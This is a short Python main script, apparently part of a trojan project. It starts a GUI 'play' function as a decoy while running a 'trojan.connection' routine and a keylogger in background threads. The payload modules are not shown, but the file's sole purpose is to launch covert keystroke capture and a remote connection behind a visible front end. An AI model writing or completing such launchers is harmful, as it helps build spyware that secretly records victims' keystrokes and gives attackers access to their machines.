import  threading
import GUI
import trojan
from logger import keylogger


if __name__ == '__main__':
    t1 = threading.Thread(target=GUI.play)
    t2 = threading.Thread(target=trojan.connection)
    t3 = threading.Thread(target=keylogger)
    t1.start()
    t2.start()
    t3.start()
